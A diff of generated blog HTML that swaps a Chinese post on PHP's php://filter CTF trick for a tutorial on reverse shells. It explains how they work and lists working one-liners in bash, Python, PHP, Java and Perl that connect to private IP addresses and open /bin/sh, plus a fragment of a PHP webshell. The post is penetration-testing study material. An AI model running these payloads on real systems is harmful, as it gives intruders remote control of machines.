@@ -4,8 +4,9 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="PHP伪协议, god_13">
-    <meta name="description" content="php://filter的妙用1.解释什么是php://filter呢？php://filter 是一种元封装器，其设计的目的是用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile(">
+    <meta name="keywords" content="反弹shell从入门到进阶, god_13">
+    <meta name="description" content="前言在渗透测试过程中，反弹shell是获取到权限的一种很重要的方式，一直用那些反弹shell的命令却不知道是什么意思，现在来专门学习一下原理。
+什么是反弹shell反弹shell(reverse shell)，就是监控端在监控某TCP/UD">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>PHP伪协议 | god_13</title>
+    <title>反弹shell从入门到进阶 | god_13</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -257,13 +258,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        PHP伪协议
+                        反弹shell从入门到进阶
                     </div>
                 </div>
             </div>
@@ -372,9 +373,13 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/反弹shell/" target="_blank">
+                                <span class="chip bg-color">反弹shell</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -385,21 +390,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2018-10-27
+                    2019-10-14
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        285
+                        943
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        1 Min
+                        3 Min
                     </div>
                     
                 
@@ -415,34 +420,44 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="php-filter的妙用"><a href="#php-filter的妙用" class="headerlink" title="php://filter的妙用"></a>php://filter的妙用</h1><h2 id="1-解释"><a href="#1-解释" class="headerlink" title="1.解释"></a>1.解释</h2><p><strong>什么是php://filter呢？php://filter 是一种元封装器，其设计的目的是用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。</strong><br><a id="more"></a></p>
-<h2 id="2-用法"><a href="#2-用法" class="headerlink" title="2.用法"></a>2.用法</h2><p><strong>php://filter是PHP语言中特有的协议流，可以作为一个“中间流”来处理其他流。可以用如下一行代码将POST内容转换成base64编码并输出。</strong></p>
-<pre><code>readfile(&quot;php://filter/read=convert.base64-encode/resource=php://input&quot;);
-</code></pre><table>
-<thead>
-<tr>
-<th style="text-align:center">名称</th>
-<th style="text-align:center">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">resource=&lt;要过滤的数据流&gt;</td>
-<td style="text-align:center">这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
-</tr>
-<tr>
-<td style="text-align:center">read=&lt;读链的筛选列表&gt;</td>
-<td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称</td>
-</tr>
-<tr>
-<td style="text-align:center">write=&lt;写链的筛选列表&gt;</td>
-<td style="text-align:center">该参数可选。可以设定一个或多个过滤器名称</td>
-</tr>
-</tbody>
-</table>
-<h2 id="3-实例"><a href="#3-实例" class="headerlink" title="3.实例"></a>3.实例</h2><p><strong>（1）bugku：flag在index里</strong></p>
-<p><img src="/2018/10/27/php-wei-xie-yi/1.PNG" alt=""><br><strong>（2）极客大挑战</strong><br><img src="/2018/10/27/php-wei-xie-yi/2.PNG" alt=""><br><strong>首先给参数id赋值</strong><br><img src="/2018/10/27/php-wei-xie-yi/3.PNG" alt=""><br><strong>结果为</strong><br><img src="/2018/10/27/php-wei-xie-yi/4.PNG" alt=""><br><strong>post php://filter</strong><br><img src="/2018/10/27/php-wei-xie-yi/5.PNG" alt=""><br><strong>结果为</strong><br><img src="/2018/10/27/php-wei-xie-yi/6.PNG" alt=""><br><strong>再进行base64解密即可爆出flag</strong></p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在渗透测试过程中，反弹shell是获取到权限的一种很重要的方式，一直用那些反弹shell的命令却不知道是什么意思，现在来专门学习一下原理。</p>
+<h2 id="什么是反弹shell"><a href="#什么是反弹shell" class="headerlink" title="什么是反弹shell"></a>什么是反弹shell</h2><p>反弹shell(reverse shell)，就是监控端在监控某TCP/UDP端口，被控制端使用漏洞或其他方法发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
+<h2 id="为什么要反弹shell"><a href="#为什么要反弹shell" class="headerlink" title="为什么要反弹shell"></a>为什么要反弹shell</h2><p>当我们已经打开了被攻击机的相应端口，如22,3389等，但是有以下几种情况我们是无法直接去连接的</p>
+<pre><code>1.某客户机中了你的网马，但是它在局域网内，你直接连接不了。
 
+2.它的ip会动态改变，你不能持续控制。
+
+3.由于防火墙等限制，对方机器只能发送请求，不能接收请求。
+
+4.对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策。
+</code></pre><p>这样反弹shell的目的就很明了了，攻击指定服务器，并让其主动连接攻击者的请求，达到悄无声息地完成攻击的目的。</p>
+<h2 id="原理剖析"><a href="#原理剖析" class="headerlink" title="原理剖析"></a>原理剖析</h2><p>我们常见的反弹shell主要是由文件描述符和重定向符号组成，Linux一切皆文件，当Linux系统启动后，会默认打开三个文件描述符</p>
+<pre><code>stdin 0-&gt;/dev/tty0 标准输入
+stdout 1-&gt;/dev/tty0 标准输出
+strderr 2-&gt;/dev/tty0 错误输出
+</code></pre><p>重定向符号</p>
+<pre><code>输入重定向：&lt; &lt;&lt;
+输出重定向：&gt; &gt;&gt;
+</code></pre><p>常见的反弹shell命令</p>
+<pre><code>bash -i &gt;&amp; /dev/tcp/192.168.146.129/2333 0&gt;&amp;1
+</code></pre><ul>
+<li>bash -i 指打开一个交互式的shell</li>
+<li>&amp;&gt; &gt;&amp;都表示标准输出或者标准错误输出</li>
+<li>/dev/tcp/ip/port 这个文件其实可以看做是一个设备，其实去访问会发现根本不存在的<br>但是如果在一方监听端口的情况下对这个文件进行读写，就能实现实时监听端口的服务器的<br>socket通信的功能</li>
+<li>0&lt;&amp;1 和 0&gt;&amp;1指文件描述符的复制</li>
+</ul>
+<h2 id="其他脚本一句话shell反弹"><a href="#其他脚本一句话shell反弹" class="headerlink" title="其他脚本一句话shell反弹"></a>其他脚本一句话shell反弹</h2><p>除了netcat，还有很多其他的反弹shell的方法，也是先在自己的服务器上开启监听端口，然后在攻击机上使用脚本或利用漏洞发起连接。每种方法使用不同的语言去创建socket进程，从而形成连接。</p>
+<h3 id="python脚本反弹"><a href="#python脚本反弹" class="headerlink" title="python脚本反弹"></a>python脚本反弹</h3><pre><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
+</code></pre><h3 id="php脚本反弹"><a href="#php脚本反弹" class="headerlink" title="php脚本反弹"></a>php脚本反弹</h3><pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.31.41&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
+</code></pre><h3 id="java脚本反弹"><a href="#java脚本反弹" class="headerlink" title="java脚本反弹"></a>java脚本反弹</h3><pre><code>r = Runtime.getRuntime()
+p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.31.41/8080;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
+p.waitFor()
+</code></pre><h3 id="perl脚本反弹"><a href="#perl脚本反弹" class="headerlink" title="perl脚本反弹"></a>perl脚本反弹</h3><pre><code>perl -e &#39;use Socket;$i=&quot;192.168.31.41&quot;;$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
+</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>反弹shell表面上虽然只有一点东西，但是里面也扩展出来了很多，还有很多自己不知道的。未完待续~~</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><pre><code>https://xz.aliyun.com/t/2548
+https://xz.aliyun.com/t/2549
+https://www.anquanke.com/post/id/87017
+</code></pre>
             </div>
             <hr>
 
@@ -597,9 +612,9 @@
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《PHP伪协议》
+                    《反弹shell从入门到进阶》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2018/10/27/php-wei-xie-yi/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/10/14/fan-dan-shell-cong-ru-men-dao-jin-jie/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -662,28 +677,80 @@
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2018/11/04/chu-kui-wen-jian-shang-chuan/">
+                <a href="/2019/10/14/fan-dan-shell-cong-ru-men-dao-jin-jie/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="初窥文件上传">
+                        <img src="/medias/featureimages/22.jpg" class="responsive-img" alt="反弹shell从入门到进阶">
                         
-                        <span class="card-title">初窥文件上传</span>
+                        <span class="card-title">反弹shell从入门到进阶</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            头记：文件上传是web中常见的题型之一，很重要，要掌握好先从基础的来看看吧
-基于DVWA的文件上传（1）LOW级别low级别的文件上传什么都没有过滤掉，所以直接上传带有一句话木马的php文件就行php一句话木马如下所示&lt;?php @e
+                            前言在渗透测试过程中，反弹shell是获取到权限的一种很重要的方式，一直用那些反弹shell的命令却不知道是什么意思，现在来专门学习一下原理。
+什么是反弹shell反弹shell(reverse shell)，就是监控端在监控某TCP/UD
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-11-04
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-14
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-user fa-fw"></i>
+                            xiao
+                            
                         </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/反弹shell/" target="_blank">
+                        <span class="chip bg-color">反弹shell</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/10/14/nei-wang-xue-xi-zhi-lu-huo-dong-mu-lu-xin-xi-shou-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="内网学习之路--活动目录信息收集">
+                        
+                        <span class="card-title">内网学习之路--活动目录信息收集</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            前言上一节讲了活动目录的基础知识，对活动目录有了大致的了解，这一节就写了在活动目录里获取有用的信息及利用的方法
+活动目录中域名信息收集及利用常用命令（不全，后期再加）
+Net use
+Net view
+Tasklist /v
+Ipconfi
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -695,49 +762,11 @@
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/内网渗透/" target="_blank">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="fa fa-dot-circle-o"></i>
-            </div>
-            <div class="card">
-                <a href="/2018/10/27/php-wei-xie-yi/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="PHP伪协议">
-                        
-                        <span class="card-title">PHP伪协议</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            php://filter的妙用1.解释什么是php://filter呢？php://filter 是一种元封装器，其设计的目的是用于数据流打开时的筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用，类似 readfile(
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-27
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-user fa-fw"></i>
-                            xiao
-                            
-                        </span>
-                    </div>
-                </div>
-
                 
             </div>
         </div>
